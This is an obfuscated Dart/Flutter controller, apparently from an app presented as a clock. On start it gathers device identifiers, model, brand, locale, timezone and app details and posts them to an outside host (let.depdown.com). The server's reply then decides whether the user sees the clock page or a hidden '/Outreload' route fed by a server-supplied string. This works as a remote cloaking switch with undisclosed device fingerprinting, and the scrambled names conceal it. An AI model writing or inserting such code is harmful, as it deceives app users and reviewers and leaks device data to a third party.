import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class FreqHomeLogic extends GetxController {

  var zvqkwu = RxBool(false);
  var lswgqpeivr = RxBool(true);
  var ytsuz = RxString("");
  var karolann = RxBool(false);
  var daugherty = RxBool(true);
  final kbhugcwy = Dio();


  InAppWebViewController? webViewController;

  dynamic fkcrye(){
    final xdqhskipm = InternetConnectionChecker.instance;
    final yhpzrawkb = xdqhskipm.onStatusChange.skip(1).listen(
          (InternetConnectionStatus vrdyie) {
        if (vrdyie == InternetConnectionStatus.connected) {
          sknjfqlm();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            sknjfqlm();
          });
        }
      },
    );
    return yhpzrawkb;
  }

  Future<bool> nqdzpelyrt() async {
    var mhtsjzkyvd = await NetworkUtils.isNetworkAvailable();
    if(!mhtsjzkyvd){
      Get.toNamed('/Apptimeout')?.then((_){
        sknjfqlm();
      });
    }
    return mhtsjzkyvd;
  }

  @override
  void onInit() {
    super.onInit();
    fkcrye();
    sknjfqlm();
  }


  Future<void> sknjfqlm() async {

    var bxarvlmje = await nqdzpelyrt();
    if(!bxarvlmje){
      return;
    }

    karolann.value = true;
    daugherty.value = true;
    lswgqpeivr.value = false;

    kbhugcwy.post("https://let.depdown.com/6LDKURE9?no_check",data: await fwmcieh()).then((value) {
      var sktxchr = value.data["sktxchr"] as String;
      var hksd = value.data["hksd"] as bool;
      if (hksd) {
        ytsuz.value = sktxchr;
        lucy();
      } else {
        kutch();
      }
    }).catchError((e) {
      lswgqpeivr.value = true;
      daugherty.value = true;
      karolann.value = false;
    });
  }

  Future<Map<String, dynamic>> fwmcieh() async {
    final DeviceInfoPlugin hkvtmosc = DeviceInfoPlugin();
    PackageInfo vkcph_dkxfn = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xhovf = Platform.localeName;
    var KMXli = currentTimeZone;

    var yDgbTMI = vkcph_dkxfn.packageName;
    var jlOwGY = vkcph_dkxfn.version;
    var LirMYw = vkcph_dkxfn.buildNumber;

    var rvclXfNV = vkcph_dkxfn.appName;
    var XDTJZKws = "";
    var ShyxYWQ  = "";
    var zTPjaGe = "";
    var zenaWelch = "";
    var ravenCollins = "";
    var lorenzaTorp = "";
    var hilbertSchmidt = "";
    var madelineBeatty = "";
    var simChristiansen = "";
    var cameronTurner = "";


    var wUWNM = "";
    var GHVtT = false;

    if (GetPlatform.isAndroid) {
      wUWNM = "android";
      var fqdybuem = await hkvtmosc.androidInfo;

      zTPjaGe = fqdybuem.brand;

      XDTJZKws  = fqdybuem.model;
      ShyxYWQ = fqdybuem.id;

      GHVtT = fqdybuem.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wUWNM = "ios";
      var drzlaxbh = await hkvtmosc.iosInfo;
      zTPjaGe = drzlaxbh.name;
      XDTJZKws = drzlaxbh.model;

      ShyxYWQ = drzlaxbh.identifierForVendor ?? "";
      GHVtT  = drzlaxbh.isPhysicalDevice;
    }

    var res = {
      "rvclXfNV": rvclXfNV,
      "LirMYw": LirMYw,
      "jlOwGY": jlOwGY,
      "yDgbTMI": yDgbTMI,
      "XDTJZKws": XDTJZKws,
      "KMXli": KMXli,
      "zTPjaGe": zTPjaGe,
      "ShyxYWQ": ShyxYWQ,
      "xhovf": xhovf,
      "wUWNM": wUWNM,
      "GHVtT": GHVtT,
      "zenaWelch" : zenaWelch,
      "ravenCollins" : ravenCollins,
      "lorenzaTorp" : lorenzaTorp,
      "hilbertSchmidt" : hilbertSchmidt,
      "madelineBeatty" : madelineBeatty,
      "simChristiansen" : simChristiansen,
      "cameronTurner" : cameronTurner,

    };
    return res;
  }

  Future<void> kutch() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> lucy() async {
    Get.offNamed("/Outreload");
  }

  @override
  void dispose() {
    fkcrye().cancel();
    super.dispose();
  }

}
